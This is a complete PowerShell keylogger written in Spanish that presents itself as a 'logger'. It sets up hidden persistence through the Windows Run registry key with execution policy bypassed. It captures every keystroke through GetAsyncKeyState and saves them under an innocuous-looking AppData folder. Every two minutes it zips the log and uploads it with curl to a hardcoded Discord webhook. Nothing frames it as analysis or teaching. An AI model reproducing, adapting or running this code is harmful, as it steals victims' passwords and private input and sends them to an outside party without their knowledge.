# LOGGER.PS1 - Logger robusto con buffer y persistencia automática

# === CONFIGURACIÓN ===
$logDir = "$env:APPDATA\SystemLogs"
$logFile = "$logDir\log.txt"
$logZip = "$env:TEMP\logger.zip"
$lastSendFile = "$logDir\lastsend.txt"
$webhookUrl = "https://discord.com/api/webhooks/1403475722776871033/762S8PxXk-xvAR5_0v95C5Of-pfWYKpJnYO3i1e5w9CEFiz-HUQByB_8ycBZKs4DzaXt"
$intervalMins = 2      # Intervalo de envío en minutos
$flushSize = 20        # Cantidad de teclas antes de escribir a disco
$taskName = "SystemLogger"

# === PERSISTENCIA AUTOMÁTICA ===
$runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$existing = Get-ItemProperty -Path $runKey -Name $taskName -ErrorAction SilentlyContinue
if (-not $existing) {
    $command = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    Set-ItemProperty -Path $runKey -Name $taskName -Value $command
}

# === CREAR DIRECTORIO DE LOG ===
if (-not (Test-Path $logDir)) { New-Item -ItemType Directory -Path $logDir -Force | Out-Null }

# === DEFINICIÓN DE DLL PARA TECLAS ===
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Keyboard {
    [DllImport("user32.dll")]
    public static extern int GetAsyncKeyState(int i);
}
"@

# === FUNCIÓN: ENVIAR ZIP VIA CURL ===
function Send-LogAsZip {
    param ([string]$filePath)
    if (-not (Test-Path $filePath)) { return $false }
    try {
        Compress-Archive -Path $filePath -DestinationPath $logZip -Force
        $cmd = "curl.exe -F `"file1=@$logZip`" -F `"content=Registro de sistema`" `"$webhookUrl`""
        Invoke-Expression $cmd | Out-Null
        Remove-Item $logZip -Force -ErrorAction SilentlyContinue
        return $true
    } catch {
        Add-Content -Path $filePath -Value "[$(Get-Date)] ERROR al enviar ZIP: $_"
        return $false
    }
}

# === BUCLE PRINCIPAL ===
$buffer = ""
while ($true) {
    # Captura de teclas
    for ($i = 1; $i -le 255; $i++) {
        $keyState = [Keyboard]::GetAsyncKeyState($i)
        if ($keyState -eq -32767) {
            $char = [char]$i
            if ([char]::IsControl($char)) { $char = "[CTRL+$i]" }
            $buffer += $char

            if ($buffer.Length -ge $flushSize) {
                Add-Content -Path $logFile -Value $buffer
                $buffer = ""
            }
        }
    }

    # Envío cada $intervalMins minutos
    $now = Get-Date
    $lastSend = if (Test-Path $lastSendFile) { Get-Content $lastSendFile | Get-Date } else { $now.AddHours(-3) }
    if (($now - $lastSend).TotalMinutes -ge $intervalMins) {
        if (Send-LogAsZip -filePath $logFile) {
            Clear-Content -Path $logFile -ErrorAction SilentlyContinue
            $now.ToString("o") | Out-File -FilePath $lastSendFile -Force
        }
    }

    Start-Sleep -Milliseconds 250
}
